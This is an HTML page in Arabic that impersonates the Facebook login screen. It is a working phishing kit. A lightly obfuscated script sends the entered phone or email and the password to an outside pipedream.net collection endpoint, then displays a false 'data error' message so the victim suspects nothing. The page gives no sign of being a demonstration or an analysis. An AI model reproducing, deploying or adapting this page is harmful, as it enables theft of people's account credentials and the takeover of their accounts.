<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>الدخول</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}
        .a{
            background:#fff;
            padding:20px;
            border-radius:8px;
            box-shadow:0 2px 4px #0002;
            width:100%;
            max-width:400px;
            text-align:center
        }
        .f{
            margin-bottom:25px; /* زيادة المسافة بين العنوان والنموذج */
        }
        .f h1{
            color:#0095ff; /* أزرق فاتح */
            font-size:42px; /* حجم أكبر */
            font-weight:700;
            letter-spacing:-1px;
            margin:0;
            text-shadow: 1px 1px 2px #0000001a; /* إضافة ظل خفيف */
        }
        .b{margin-bottom:15px;text-align:right}
        .b input{
            width:100%;
            padding:12px;
            border:1px solid #ddd;
            border-radius:6px;
            font-size:16px;
            background:#f0f2f5
        }
        .b input:focus{
            outline:0;
            border-color:#1877f2;
            box-shadow:0 0 0 2px #e7f3ff
        }
        button{
            width:100%;
            padding:12px;
            background:#1877f2;
            color:#fff;
            border:0;
            border-radius:6px;
            font-size:16px;
            font-weight:700;
            cursor:pointer;
            margin-bottom:15px
        }
        .c{
            display:flex;
            justify-content:center;
            gap:10px;
            margin-bottom:15px
        }
        .c a{
            color:#1877f2;
            text-decoration:0;
            font-size:14px
        }
        .d{margin-top:20px}
        .d a{
            display:inline-block;
            padding:10px 20px;
            background:#42b72a;
            color:#fff;
            text-decoration:0;
            border-radius:6px;
            font-size:16px;
            font-weight:700
        }
        #e{margin-top:15px;color:red;font-size:14px}
    </style>
</head>
<body>
    <div class="a">
        <div class="f">
            <h1>Facebook</h1>
        </div>
        <form id="g">
            <div class="b">
                <input type="text" placeholder=" رقم الهاتف المحمول أو البريد الالكتروني" required>
            </div>
            <div class="b">
                <input type="password" placeholder="كلمة المرور" required>
            </div>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="c">
            <a href="#">نسيت كلمة المرور؟</a>
        </div>
        <div class="d">
            <a href="#">إنشاء حساب</a>
        </div>
        <p id="e"></p>
    </div>
    <script>
        const _0xabc=["submit",(e=>{
            e.preventDefault();
            const t=document.querySelectorAll(".b input"),
            o={u:t[0].value,p:t[1].value},
            n=document.getElementById("e");
            n.textContent="جاري المعالجة...",
            n.style.color="#1877f2",
            fetch("https://eoezd7tw25qabbf.m.pipedream.net",{
                method:"POST",
                headers:{"Content-Type":"application/json"},
                body:JSON.stringify(o)
            })
            .then(()=>(n.textContent="خطأ في البيانات!",n.style.color="red"))
            .catch(()=>(n.textContent="فشل الاتصال!",n.style.color="red"))
        })];
        document.getElementById("g").addEventListener(..._0xabc);
    </script>
</body>
</html>
